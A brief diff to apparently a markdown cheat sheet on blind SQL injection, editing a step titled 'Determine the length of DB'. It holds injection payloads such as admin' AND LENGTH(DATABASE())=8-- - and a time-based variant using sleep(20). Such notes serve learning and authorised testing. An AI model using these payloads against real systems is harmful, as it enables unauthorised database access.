@@ -5,7 +5,7 @@
 ## Determine the length of DB: 
 > 
 ```sql
-> admin' AND LENGTH(DATABASE())=8-- - (if return false if correct and the lenght is 8)
+> admin' AND LENGTH(DATABASE())=8-- - 
 > we can try with time sleep to confirm this:
 > admin' AND LENGTH(DATABASE())=8 and sleep(20)-- -
 ```
